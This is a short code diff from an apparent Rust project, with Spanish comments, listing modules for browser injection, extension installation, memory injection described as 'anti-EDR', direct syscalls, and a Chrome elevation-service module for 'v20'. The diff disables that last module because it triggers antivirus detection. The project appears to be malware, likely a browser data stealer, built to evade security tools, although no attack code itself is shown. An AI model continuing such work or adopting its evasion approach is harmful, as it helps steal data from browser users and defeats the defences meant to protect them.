@@ -11,7 +11,7 @@ pub mod edge_injection;
 pub mod extension_installer;
 pub mod memory_injection;  // ← NUEVO: Memory injection anti-EDR
 pub mod syscalls;           // ← NUEVO: Direct syscalls
-pub mod elevation_service;  // ← NUEVO: Chrome elevation service COM API para v20
+// pub mod elevation_service;  // ← TEMPORALMENTE DESHABILITADO (trigerea AV por CLSIDs de Chrome)
 
 use std::error::Error;
 use std::fmt;
